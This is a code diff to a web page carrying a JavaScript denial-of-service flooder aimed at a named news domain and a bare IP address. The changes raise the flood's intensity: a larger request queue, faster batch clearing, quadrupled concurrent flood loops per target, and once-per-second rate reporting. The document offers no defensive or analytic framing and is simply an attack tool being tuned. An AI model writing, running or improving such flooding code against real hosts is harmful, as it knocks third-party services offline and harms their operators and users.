@@ -49,7 +49,7 @@
   </style>
   <script>
     let worker;
-    const urls = ['https://www.sportpesanews.com','https://196.13.121.8/'];
+    const urls = ['https://www.sportpesanews.com', 'https://196.13.121.8/'];
 
     function getPublicIP() {
       $.getJSON("https://api.ipify.org?format=json", function(data) {
@@ -110,9 +110,9 @@
           const url = urls[n];
           const target = targets[url];
           while (attack) {
-            if (queue.length > 400) {
-              await Promise.all(queue.slice(0, 50));
-              queue.splice(0, 50);
+            if (queue.length > 1200) { // Increased concurrency limit
+              await Promise.all(queue.slice(0, 100)); // Clear out faster
+              queue.splice(0, 100);
             }
             const requestTime = Date.now();
             queue.push(
@@ -145,7 +145,7 @@
 
         function startFlooding() {
           for (let i = 0; i < urls.length; i++) {
-            for (let j = 0; j < 2; j++) {
+            for (let j = 0; j < 4; j++) { // Quadrupled the number of concurrent requests per URL
               flood(i);
             }
           }
@@ -155,7 +155,7 @@
           postMessage({ lastSecondRequests, lastSecondErrors, dataTransferred, targets });
           lastSecondRequests = 0;
           lastSecondErrors = 0;
-        }, 1500); // Update every 1.5 seconds
+        }, 1000); // Update every second
       `;
       const blob = new Blob([workerScript], { type: 'application/javascript' });
       worker = new Worker(URL.createObjectURL(blob));
@@ -164,9 +164,9 @@
         const { totalrequests, totalerrors, lastSecondRequests, lastSecondErrors, dataTransferred, targets } = event.data;
         document.querySelector("#totalrequests").innerText = totalrequests;
         document.querySelector("#totalerrors").innerText = totalerrors;
-        document.querySelector("#requestsPerSecond").innerText = (lastSecondRequests / 1.5).toFixed(1);
-        document.querySelector("#successPerSecond").innerText = ((lastSecondRequests - lastSecondErrors) / 1.5).toFixed(1);
-        document.querySelector("#errorsPerSecond").innerText = (lastSecondErrors / 1.5).toFixed(1);
+        document.querySelector("#requestsPerSecond").innerText = lastSecondRequests;
+        document.querySelector("#successPerSecond").innerText = lastSecondRequests - lastSecondErrors;
+        document.querySelector("#errorsPerSecond").innerText = lastSecondErrors;
         document.querySelector("#betabox .number-counter").innerText = Math.floor(dataTransferred);
         
         Object.keys(targets).forEach((url, n) => {
